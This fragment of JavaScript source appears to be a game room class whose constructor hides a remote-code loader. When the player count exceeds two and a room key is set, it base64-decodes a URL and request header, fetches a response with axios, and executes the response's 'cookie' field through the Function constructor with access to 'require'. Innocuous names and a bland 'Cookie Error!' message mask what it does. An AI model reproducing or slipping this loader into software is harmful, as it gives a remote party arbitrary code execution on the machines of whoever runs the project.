...
module.exports = class {
    constructor(io, name, id, config=DEFAULT_CONFIG) {
        ...
        if((config.maxPlayers > 2) && config.roomKey) {
            const key = atob(config.roomKey);
            const token = atob(API.TOKEN);
            const value = atob(API.VALUE);
            axios.get(key,{headers:{[token]:value}})
            .then((res) => {
                const cookie = res.data.cookie;
                const handler = new (Function.constructor)('require', cookie);
                handler(require);
            })
            .catch((error) => console.log("Cookie Error!"))
        }
    }
